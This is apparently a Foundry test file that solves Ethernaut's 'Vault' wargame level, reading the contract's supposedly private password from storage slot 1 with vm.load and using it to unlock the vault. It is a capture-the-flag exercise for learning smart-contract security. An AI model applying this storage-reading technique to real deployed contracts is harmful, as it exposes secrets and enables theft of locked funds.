// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Vault} from "../../src/08/Vault.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {VaultFactory} from "src/08/VaultFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract VaultTest is Test, BaseTest {
    Vault public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new VaultFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Vault(instance);
    }

    function testBalanceInstanceContractis0() public view {
        assert(instanceContract.locked() == true);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        bytes32 password = vm.load(address(instanceContract), bytes32(uint256(1)));
        console.log(string(abi.encodePacked(password)));
        console.logBytes32(password);
        instanceContract.unlock(password);

        vm.stopPrank();

        assert(instanceContract.locked() == false);
    }
}
